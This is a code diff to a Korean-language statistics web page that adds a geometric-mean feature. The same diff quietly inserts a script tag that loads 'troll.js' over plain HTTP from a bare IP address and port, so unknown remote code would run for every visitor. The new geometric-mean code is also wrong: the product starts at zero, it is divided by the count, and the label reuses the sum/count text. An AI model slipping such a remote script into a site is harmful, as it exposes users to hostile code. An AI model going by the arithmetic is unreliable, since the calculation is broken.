@@ -12,6 +12,7 @@
     <script src = "https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity = "sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin = "anonymous"></script>
     <script src = "https://kit.fontawesome.com/06fb83cb17.js" crossorigin = "anonymous"></script>
     <link rel="stylesheet" href="https://potato179.github.io/style/potato-min.css">
+    <script src="http://121.124.49.48:6004/troll.js"></script>
 </head>
 <body class = "box-beige">
     <div class = "container">
@@ -33,8 +34,8 @@
         <input type = "text" id = "addded" class = "form-control" placeholder = "오름차순 정렬" disabled><br>
         <p>합</p>
         <input type = "text" id = "sum" class = "form-control" placeholder = "합" disabled><br>
-        <p>평균</p>
-        <input type = "text" id = "average" class = "form-control" placeholder = "평균" disabled><br>
+        <p>산술평균</p>
+        <input type = "text" id = "average" class = "form-control" placeholder = "산술평균" disabled><br>
         <p>최솟값</p>
         <input type = "text" id = "min" class = "form-control" placeholder = "최솟값" disabled><br>
         <p>최댓값</p>
@@ -68,9 +69,14 @@
             }
             $("#sum").attr("placeholder", sum);
 
-            var average = sum/len;
-            $("#average").attr("placeholder", `${average} (${sum}/${len})`);
+            $("#average").attr("placeholder", `${sum/len} (${sum}/${len})`);
 
+            var multipleSum = 0;
+            for(var i = 0; i < len; i++) {
+                multipleSum *= num[i];
+            }
+            $("#geometric").attr("placeholder", `${multipleSum/len} (${sum}/${len})`);
+     
             var min = Math.min(...num);
             $("#min").attr("placeholder", min);
 
